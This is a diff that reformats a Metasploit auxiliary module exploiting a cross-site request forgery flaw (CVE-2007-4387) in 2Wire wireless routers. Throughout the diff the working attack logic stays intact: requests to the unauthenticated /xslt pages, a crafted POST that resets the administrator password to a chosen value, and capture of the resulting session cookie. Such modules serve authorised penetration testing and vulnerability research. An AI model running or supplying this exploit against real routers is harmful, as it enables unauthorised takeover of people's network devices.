@@ -6,33 +6,36 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "2Wire Cross-Site Request Forgery Password Reset Vulnerability",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "2Wire Cross-Site Request Forgery Password Reset Vulnerability",
+        'Description' => %q{
           This module will reset the admin password on a 2Wire wireless router.  This is
-        done by using the /xslt page where authentication is not required, thus allowing
-        configuration changes (such as resetting the password) as administrators.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'hkm [at] hakim.ws',              #Initial discovery, poc
-          'Travis Phillips',  #Msf module
+          done by using the /xslt page where authentication is not required, thus allowing
+          configuration changes (such as resetting the password) as administrators.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'hkm [at] hakim.ws', # Initial discovery, poc
+          'Travis Phillips', # Msf module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2007-4387' ],
           [ 'OSVDB', '37667' ],
           [ 'BID', '36075' ],
           [ 'URL', 'https://seclists.org/bugtraq/2007/Aug/225' ],
         ],
-      'DisclosureDate' => '2007-08-15' ))
+        'DisclosureDate' => '2007-08-15'
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])
-        ])
+    register_options(
+      [
+        OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])
+      ]
+    )
   end
 
   def post_auth?
@@ -40,13 +43,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     print_status("Attempting to connect to http://#{rhost}/xslt?PAGE=A07 to gather information")
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/xslt?PAGE=A07',
-    }, 25)
+      {
+        'method' => 'GET',
+        'uri' => '/xslt?PAGE=A07',
+      }, 25
+    )
 
     if not res
       print_error("No response from server")
@@ -108,15 +111,16 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Connecting to http://#{rhost}/xslt?PAGE=H04 to make sure page exist.")
 
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/xslt?PAGE=H04',
-    }, 25)
+      {
+        'method' => 'GET',
+        'uri' => '/xslt?PAGE=H04',
+      }, 25
+    )
 
-    if ( res and res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
+    if (res and res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
       print_status("Found password reset page. Attempting to reset admin password to #{datastore['PASSWORD']}")
 
-      data  = 'PAGE=H04_POST'
+      data = 'PAGE=H04_POST'
       data << '&THISPAGE=H04'
       data << '&NEXTPAGE=A01'
       data << '&PASSWORD=' + datastore['PASSWORD']
@@ -124,20 +128,20 @@ class MetasploitModule < Msf::Auxiliary
       data << '&HINT='
 
       res = send_request_cgi(
-      {
-        'method'  => 'POST',
-        'uri'     => '/xslt',
-        'data'    => data,
-      }, 25)
+        {
+          'method' => 'POST',
+          'uri' => '/xslt',
+          'data' => data,
+        }, 25
+      )
 
       if res and res.code == 200
         cookies = res.get_cookies
         if cookies && cookies.match(/(.*); path=\//)
-          cookie= $1
+          cookie = $1
           print_good("Got cookie #{cookie}. Password reset was successful!\n")
         end
       end
     end
-
   end
 end
